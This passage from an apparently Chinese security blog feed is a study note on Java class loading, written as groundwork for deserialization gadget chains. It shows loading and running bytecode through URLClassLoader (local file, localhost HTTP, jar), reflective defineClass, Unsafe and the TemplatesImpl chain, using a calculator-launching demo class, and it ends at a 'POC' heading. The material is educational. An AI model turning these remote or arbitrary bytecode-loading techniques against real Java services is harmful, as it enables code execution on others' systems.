<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>目前遇到最简单的windows靶机，虽然开了很多端口但是没什么用，学习到Server Operator权限相关内容，不错</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>htb</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>java反序列化基础之类加载</title>
    <url>/2025/02/14/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E4%B9%8B%E7%B1%BB%E5%8A%A0%E8%BD%BD/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>cc链看到cc3，涉及到类加载，之前囫囵吞枣地学了些，还是不够牢固。于是写篇笔记给自己理清楚。参考了很多前辈的文章，感谢，如果有任何不对的，欢迎找我指正🙏</p>
<h4 id="Java类加载机制"><a href="#Java类加载机制" class="headerlink" title="Java类加载机制"></a>Java类加载机制</h4><p>借用网上一张图</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250214132308.png"   style="zoom:50%;" >

<p>.java 编译后生成 .class文件保存在本地，如果我们要执行class文件，就需要经过一系列的生命周期和初始化操作，最后目的就是让JVM成功执行。</p>
<p>看这个流程图就知道<strong>类的加载就是由java类加载器实现的，作用将类文件进行动态加载到java虚拟机内存中运行。</strong></p>
<h4 id="几个类加载器"><a href="#几个类加载器" class="headerlink" title="几个类加载器"></a>几个类加载器</h4><h5 id="BootstrapClassLoader"><a href="#BootstrapClassLoader" class="headerlink" title="BootstrapClassLoader"></a>BootstrapClassLoader</h5><p>这个也叫引导类加载器，比较底层，由C++代码编写，属于JVM的一部分。不继承 <code>java.lang.ClassLoader</code> 类，也没有父加载器，主要负责加载核心 java 库(即 JVM 本身)，存储在 <code>/jre/lib/rt.jar</code> 目录当中。(同时处于安全考虑，<code>BootstrapClassLoader</code> 只加载包名为 <code>java</code>、<code>javax</code>、<code>sun</code> 等开头的类)。</p>
<h5 id="ExtensionsClassLoader"><a href="#ExtensionsClassLoader" class="headerlink" title="ExtensionsClassLoader"></a>ExtensionsClassLoader</h5><p>也叫拓展类加载器，由 <code>sun.misc.Launcher$ExtClassLoader</code> 类实现，用来在 <code>/jre/lib/ext</code> 或者 <code>java.ext.dirs</code> 中指明的目录加载 java 的扩展库。Java 虚拟机会提供一个扩展库目录，此加载器在目录里面查找并加载 java 类。</p>
<h5 id="AppClassLoader"><a href="#AppClassLoader" class="headerlink" title="AppClassLoader"></a>AppClassLoader</h5><p>App类加载器&#x2F;系统类加载器（AppClassLoader），由 <code>sun.misc.Launcher$AppClassLoader</code> 实现，一般通过( <code>java.class.path</code> 或者 <code>Classpath</code> 环境变量)来加载 Java 类，也就是我们常说的 classpath 路径。通常我们是使用这个加载类来加载 Java 应用类，可以使用 <code>ClassLoader.getSystemClassLoader()</code> 来获取它。</p>
<h5 id="UserDefineClassLoader"><a href="#UserDefineClassLoader" class="headerlink" title="UserDefineClassLoader"></a>UserDefineClassLoader</h5><p>除了上面说的三种，用户还可以通过继承<code>java.lang.ClassLoader</code>类的方式实现自己的类加载器。</p>
<p>我们介绍的几个ClassLoader之间有父子关系（不是继承），在Java.lang.ClassLoader里面定义了指向父加载器的常量 parent, 可以通过调用 getParent() 方法获取父加载器。可以看一个代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(ClassLoader.getSystemClassLoader());</span><br><span class="line">        System.out.println(ClassLoader.getSystemClassLoader().getParent());</span><br><span class="line">        System.out.println(ClassLoader.getSystemClassLoader().getParent().getParent());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打印出来是（这里的null其实就是BootstrapClassLoader，因为是c++实现的，所以无法在java中获取到相应的引用）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sun.misc.Launcher$AppClassLoader@5ce65a89</span><br><span class="line">sun.misc.Launcher$ExtClassLoader@1edf1c96</span><br><span class="line">null</span><br></pre></td></tr></table></figure>

<p>几个ClassLoader关系如下：</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250214141003.png" ></p>
<p>所有ClassLoader都继承自<code>java.lang.ClassLoader</code> 这个抽象类， ExtClassLoader 和 AppClassLoader 继承自 <code>URLClassLoader</code>， <code>URLClassLoader</code>既可以加载本地字节码，也可以加载远程字节码。</p>
<p><code>java.lang.ClassLoader</code> 是所有 ClassLoader 的基石，在这个抽象类中定义了几个比较重要的方法</p>
<ul>
<li>loadClass(): 基于双亲委派机制查找 Class, 调用父加载器的 loadClass 方法或自身的 findClass 方法</li>
<li>findClass(): 根据名称和位置读取字节码, 并调用 defineClass 方法, 具体实现由子类重写</li>
<li>defineClass(): 把 byte 数组形式的字节码转换成对应的 Class 对象 (真正加载字节码的地方)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">loadClass() -&gt; findClass() -&gt; defineClass()</span><br></pre></td></tr></table></figure>

<h4 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h4><p>先说一下class有两种加载方式</p>
<ul>
<li><p>隐式加载：通过 new 实例化类, 或通过 <code>类名.方法名()</code> 调用其静态方法, 或调用其静态属性</p>
</li>
<li><p>显式加载：通过反射的形式, 例如 <code>Class.forName()</code> 或者调用 ClassLoader 的 loadClass 方法</p>
</li>
</ul>
<p>然后我们的类加载基于双亲委派机制：<strong>当一个类加载器收到了类加载的请求的时候，他不会直接去加载指定的类，而是把这个请求委托给自己的父加载器去加载。只有父加载器无法加载这个类的时候，才会由当前这个加载器来负责类的加载</strong></p>
<p>可以看一下实现代码，<strong>java.lang.ClassLoader的loadClass()方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">            <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">            Class&lt;?&gt; c = findLoadedClass(name); <span class="comment">// 检查类是否已经被加载</span></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                        c = parent.loadClass(name, <span class="literal">false</span>); <span class="comment">// 调用父类的loadClass，委托下一层</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        c = findBootstrapClassOrNull(name); <span class="comment">// 此时父加载器为 BootstrapClassLoader</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                    <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                    <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                    <span class="comment">// to find the class.</span></span><br><span class="line">                    <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                    c = findClass(name); <span class="comment">// 尝试调用自己的 findClass 方法来加载 class</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                    sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">                resolveClass(c);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>简单流程就是1、先检查类是否已经被加载过 2、若没有加载则调用父加载器的loadClass()方法进行加载 3、若父加载器为空则默认使用启动类加载器作为父加载器。 4、如果父类加载失败，抛出ClassNotFoundException异常后，再调用自己的findClass()方法进行加载。</p>
<h4 id="不同场景下代码块加载顺序"><a href="#不同场景下代码块加载顺序" class="headerlink" title="不同场景下代码块加载顺序"></a>不同场景下代码块加载顺序</h4><p>基础认知</p>
<ul>
<li>静态代码块：<code>static&#123;&#125;</code></li>
<li>构造代码块：<code>&#123;&#125;</code></li>
<li>无参构造器：<code>ClassName()</code></li>
<li>有参构造器：<code>ClassName(String name)</code></li>
</ul>
<p>先写一个Dog.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> staticVar;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> instanceVar;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Dog()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造器&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Dog(<span class="type">int</span> instanceVar)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;有参构造器&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">staticAction</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="场景一：实例化对象"><a href="#场景一：实例化对象" class="headerlink" title="场景一：实例化对象"></a>场景一：实例化对象</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打印</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">静态代码块</span><br><span class="line">构造代码块</span><br><span class="line">无参构造器</span><br></pre></td></tr></table></figure>

<p>所以当我们使用<code>new</code>来实例化对象的时候，会先调用静态代码块，再调用动态代码块，再根据不同的实例化方法调用不同的构造器</p>
<h5 id="场景二：调用静态方法"><a href="#场景二：调用静态方法" class="headerlink" title="场景二：调用静态方法"></a>场景二：调用静态方法</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Dog.staticAction();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打印</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">静态代码块</span><br><span class="line">静态方法</span><br></pre></td></tr></table></figure>

<p>所以当我们不实例化对象直接调用静态方法，会先调用类中的静态代码块，然后调用静态方法</p>
<h5 id="场景三：对类中的静态成员赋值"><a href="#场景三：对类中的静态成员赋值" class="headerlink" title="场景三：对类中的静态成员赋值"></a>场景三：对类中的静态成员赋值</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Dog.staticVar = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打印</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">静态代码块</span><br></pre></td></tr></table></figure>

<p>所以对静态成员变量赋值前，会调用静态代码块</p>
<h5 id="场景四：使用class获取类"><a href="#场景四：使用class获取类" class="headerlink" title="场景四：使用class获取类"></a>场景四：使用class获取类</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Dog.class;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有输出任何东西</p>
<h5 id="场景五：使用forName获取类"><a href="#场景五：使用forName获取类" class="headerlink" title="场景五：使用forName获取类"></a>场景五：使用forName获取类</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException&#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.Dog&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打印 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">静态代码块</span><br></pre></td></tr></table></figure>

<p>还有</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;com.Dog&quot;</span>, <span class="literal">true</span>, ClassLoader.getSystemClassLoader());</span><br><span class="line"><span class="comment">// 打印“静态代码块”</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.Dog&quot;</span>, <span class="literal">false</span>, ClassLoader.getSystemClassLoader());</span><br><span class="line"><span class="comment">// 没有打印 因为这个通过false控制只加载，没有初始化</span></span><br></pre></td></tr></table></figure>

<h4 id="利用URLClassLoader加载class文件"><a href="#利用URLClassLoader加载class文件" class="headerlink" title="利用URLClassLoader加载class文件"></a>利用URLClassLoader加载class文件</h4><p><code>URLClassLoader</code> 实际上是我们平时默认使用的 <code>AppClassLoader</code> 的父类，所以，我们解释 <code>URLClassLoader</code> 的工作过程实际上就是在解释默认的 <code>Java </code>类加载器的工作流程。</p>
<p>先新建一个calc类，注意这里没有声明Calc再哪个包，就是自由的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构建生成Calc.class文件，把它放在目录下</p>
<h5 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com;</span><br><span class="line"></span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line">public class URLLoader &#123;</span><br><span class="line">    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]&#123;new URL(&quot;file:///Users/lingtian/Downloads/&quot;)&#125;);</span><br><span class="line">        Class calc = urlClassLoader.loadClass(&quot;Calc&quot;);</span><br><span class="line">        calc.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h5><p>在Clac.class所在目录开一个http服务</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://localhost:8000/&quot;</span>)&#125;);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">calc</span> <span class="operator">=</span> urlClassLoader.loadClass(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        calc.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务器这边也可以看到接收到请求</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250214154610.png" ></p>
<h5 id="jar-file"><a href="#jar-file" class="headerlink" title="jar+file"></a>jar+file</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jar -cvf Calc.jar Clac.class</span><br></pre></td></tr></table></figure>

<p>生成一个jar文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;jar:file:///Users/lingtian/Downloads/Calc.jar!/&quot;</span>)&#125;);</span><br><span class="line"><span class="type">Class</span> <span class="variable">calc</span> <span class="operator">=</span> urlClassLoader.loadClass(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">calc.newInstance();</span><br></pre></td></tr></table></figure>

<p>就是调用前面多一个jar:，总体逻辑是一样的，要注意包声明的位置，需要对得上</p>
<h5 id="jar-http"><a href="#jar-http" class="headerlink" title="jar+http"></a>jar+http</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;jar:http://127.0.0.1:8000/Calc.jar!/&quot;</span>)&#125;);</span><br><span class="line"><span class="type">Class</span> <span class="variable">calc</span> <span class="operator">=</span> urlClassLoader.loadClass(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">calc.newInstance();</span><br></pre></td></tr></table></figure>

<h4 id="利用-ClassLoader-defineClass-直接加载字节码"><a href="#利用-ClassLoader-defineClass-直接加载字节码" class="headerlink" title="利用 ClassLoader#defineClass 直接加载字节码"></a>利用 ClassLoader#defineClass 直接加载字节码</h4><p>默认的ClassLoader#defineClass方法是native，逻辑在JVM里面的C语言</p>
<p>看一下defineclass的调用模式，name就是类名，b为字节码数组，off为偏移量，len为字节码长度</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span><br></pre></td></tr></table></figure>

<p>因为是保护的属性，无法在外部直接访问，所以我们需要反射调用<code>defineClass()</code> 方法进行字节码的加载</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLLoaderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader(); <span class="comment">// 获取系统的类加载器</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);<span class="comment">// 通过反射获取到define方法</span></span><br><span class="line">        method.setAccessible(<span class="literal">true</span>); <span class="comment">// 设置访问权限</span></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Calc.class&quot;</span>)); <span class="comment">// 获取字节码数组</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> (Class) method.invoke(classLoader, <span class="string">&quot;Calc&quot;</span>, code, <span class="number">0</span>, code.length); <span class="comment">// 按照defineclass的调用要求依次传入参数。然后加载出类给c，其实也就是Calc类</span></span><br><span class="line">        c.newInstance(); <span class="comment">// 实现实例化</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用<code>ClassLoader#defineClass</code>直接加载字节码有个优点就是不需要出网也可以加载字节码。</p>
<h4 id="利用Unsafe-加载字节码"><a href="#利用Unsafe-加载字节码" class="headerlink" title="利用Unsafe 加载字节码"></a>利用Unsafe 加载字节码</h4><p>Unsafe也有defineClass()，本质和上一个差不多</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line"></span><br><span class="line">        Class&lt;Unsafe&gt; unsafeClass = Unsafe.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">unsafeField</span> <span class="operator">=</span> unsafeClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        unsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">classUnsafe</span> <span class="operator">=</span> (Unsafe) unsafeField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> unsafeClass.getMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class,<span class="type">int</span>.class, <span class="type">int</span>.class, ClassLoader.class, ProtectionDomain.class);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cc</span> <span class="operator">=</span> (Class) defineClassMethod.invoke(classUnsafe, <span class="string">&quot;Calc&quot;</span>, code, <span class="number">0</span>, code.length, classLoader, <span class="literal">null</span>);</span><br><span class="line">        cc.newInstance();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="TemplatesImpl加载字节码"><a href="#TemplatesImpl加载字节码" class="headerlink" title="TemplatesImpl加载字节码"></a>TemplatesImpl加载字节码</h4><h5 id="为什么要用这个"><a href="#为什么要用这个" class="headerlink" title="为什么要用这个"></a>为什么要用这个</h5><p>为什么用这个：在实际场景中，因为defineClass方法作用域却是不开放的，所以我们很很难直接利用到它，但是我们的TemplatesImpl里的作用域是default</p>
<p>目标，调用到里面的TemplatesImpl有一个内部类，TransletClassLoader，里面调用了defineClass方法（重写），而且这个内部类继承了ClassLoader，而且这个重写的defineClass方法没有写明作用域，就默认是default，所以可以被类外部调用</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241125205755573.png" ></p>
<h5 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h5><p>确定了目标，接下来确定一下调用链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TransletClassLoader#defineClass()</span><br><span class="line">	-&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="line">	 -&gt; TemplatesImpl#getTransletInstance()</span><br><span class="line">	 	-&gt; TemplatesImpl#newTransformer()</span><br><span class="line">	 		-&gt; TemplatesImpl#getOutputProperties()</span><br></pre></td></tr></table></figure>

<p>倒推前面一两个属性都是private，直到newTransformer和getOutputProperties才是public</p>
<h5 id="注意点1"><a href="#注意点1" class="headerlink" title="注意点1"></a>注意点1</h5><p>这里有一个点，就是在找defineTransletClasses上一个调用方法的时候，其实是有三个</p>
<p>但是这里getTransletClasses()和 getTransletIndex() 都在调用defineTransletClasses()后没别的动作，那么最后加载的类就无法被实例化&#x2F;初始化</p>
<p>咱们getTransletInstance()在取得了_class后会对数组里面对应的队形进行<strong>无参数</strong>初始化，满足了我们的要求</p>
<h5 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h5><p>确定了调用链，先构造一个准备被调用的类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TemplatesImpl 的字节码构造</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesBytes</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TemplatesBytes</span><span class="params">()</span> <span class="keyword">throws</span> IOException&#123; <span class="comment">// 构造方法，每次加载类的时候会自动调用</span></span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello TemplatesBytes&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里这个类需要继承<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p>
<p>然后因为AbstractTranslet这个类里面有一些抽象方法，所以需要重写，然后就直接写我们要做的事情，这里控制打印一下就好</p>
<p><strong>POC：</strong></p>
